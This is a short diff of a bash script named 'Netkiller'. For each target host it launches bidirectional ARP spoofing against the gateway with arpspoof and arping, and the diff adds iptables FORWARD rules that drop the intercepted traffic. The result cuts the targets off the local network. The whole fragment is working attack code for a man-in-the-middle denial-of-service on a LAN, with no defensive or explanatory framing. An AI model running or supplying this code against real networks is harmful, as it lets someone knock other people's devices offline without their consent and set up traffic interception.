@@ -178,12 +178,20 @@ PIDS=()
 for TARGET in "${TARGETS[@]}"; do
     echo ""
     echo "Netkiller kill the connection of $TARGET"
+
+    # Bidirectional arp spoofing 
     arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
     PIDS+=($!)
     arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 &
     PIDS+=($!)
     arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
     PIDS+=($!)
+      
+    # Set iptables rules to block/drop traffic
+    iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+    iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
+    iptables -I FORWARD -s $TARGET -j DROP
+    iptables -I FORWARD -d $TARGET -j DROP
 done
 
 # Function to clean up
